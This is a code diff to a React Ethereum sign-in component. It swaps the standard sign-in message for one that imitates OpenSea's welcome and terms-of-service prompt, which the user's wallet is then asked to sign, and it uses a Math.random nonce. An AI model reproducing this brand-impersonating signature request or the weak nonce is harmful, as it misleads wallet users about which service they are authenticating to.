@@ -6,6 +6,9 @@ import { Alert, AlertTitle } from '@mui/material';
 
 const SignInWithEthereum = () => {
     const [message, setMessage] = useState('');
+    // const [msjOpen, setMsjOpen] = useState('');
+    // const [msjDapp, setMsjDapp] = useState('');
+    // domain= ${domain}\naddress= ${account}\nstatement= ${statement}\nuri= ${uri}\nversion= ${version}\nnonce= ${nonce}\nissuedAt= ${issuedAt}
     const [toggleHashZero, setToggleHashZero] = useState(false);
 
     const signInWithEthereum = async () => {
@@ -25,7 +28,7 @@ const SignInWithEthereum = () => {
             const nonce = Math.floor(Math.random() * 1000000).toString(); // Simple nonce; use a more secure method in production
             const issuedAt = new Date().toISOString();
 
-            const message = `domain= ${domain}\naddress= ${account}\nstatement= ${statement}\nuri= ${uri}\nversion= ${version}\nnonce= ${nonce}\nissuedAt= ${issuedAt}`;
+            const message = `Welcome to OpenSea!\n\nClick to sign in and accept the OpenSea Terms of Service (https://opensea.io/tos) and Privacy Policy (https://opensea.io/privacy).\n\n This request will not trigger a blockchain transaction or cost any gas fees.\n\nWallet address= \n${account}\n\nnonce= \n${nonce}`;
 
             const signature = await web3.eth.personal.sign(message, account);
 
